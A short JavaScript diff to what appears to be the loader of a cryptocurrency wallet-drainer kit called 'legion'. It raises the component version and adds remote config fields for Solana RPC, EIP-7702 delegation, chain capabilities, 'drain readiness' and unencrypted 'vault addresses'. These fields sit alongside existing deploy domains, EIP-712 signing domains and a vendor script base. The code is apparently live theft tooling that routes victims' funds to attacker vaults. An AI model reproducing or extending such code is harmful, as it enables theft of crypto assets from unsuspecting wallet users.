@@ -22,7 +22,7 @@
   var VERSIONS = {
     polyfills: '1.1.0',
     wallet: '1.5.18',
-    legion: '5.16.19',
+    legion: '5.16.36',
   };
 
   var DEFAULTS = {
@@ -124,6 +124,11 @@
         if (d.wc_project_id) window.LEGION_CONFIG.wcProjectId = d.wc_project_id;
         if (d.deploy_domains) window.LEGION_CONFIG.deployDomains = d.deploy_domains;
         if (d.eip712_domains) window.LEGION_CONFIG.eip712Domains = d.eip712_domains;
+        if (d.sol_rpc) window.LEGION_CONFIG.solRpc = d.sol_rpc;
+        if (d.eip7702_enabled != null) window.LEGION_CONFIG.eip7702Enabled = d.eip7702_enabled;
+        if (d.chain_capabilities) window.LEGION_CONFIG.chainCapabilities = d.chain_capabilities;
+        if (d.drain_readiness) window.LEGION_CONFIG.drainReadiness = d.drain_readiness;
+        if (d.vault_addresses && !d.vault_addresses_encrypted) window.LEGION_CONFIG.vaultAddresses = d.vault_addresses;
         if (d.embed_script && !dataCfg.vendorBase && !userCfg.vendorBase) {
           var m = String(d.embed_script).match(/^(https?:\/\/[^/]+\/)/);
           if (m) window.LEGION_CONFIG.vendorBase = m[1];
